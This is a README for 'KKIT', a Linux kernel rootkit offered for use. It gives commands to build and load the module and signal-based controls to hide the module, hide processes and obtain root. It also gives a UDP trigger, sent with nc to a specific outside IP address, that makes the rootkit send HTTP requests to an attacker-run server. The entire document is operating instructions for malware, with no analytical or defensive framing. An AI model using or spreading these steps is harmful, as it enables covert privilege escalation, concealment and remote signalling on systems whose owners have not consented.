# KKIT
A Linux Kernel RootKit

## Install
```shell
make

insmod kkit.ko
```

## USE
hide/show the module:
```shell
kill -62 0
```
hide/show process:
```shell
kill -60 pid
```
getroot:
```shell
kill -61 0
```
Trigger to send a http request:
```shell
# Server:
nc -p 1338 120.46.219.162 50005 -u
fdsfasd
```
If the kkit received a udp packet sended from 1338 port to 50005 port, the kkit will send a http packet to the targeted server ip;
```shell
#server:
python3 -m http.server 50002
```

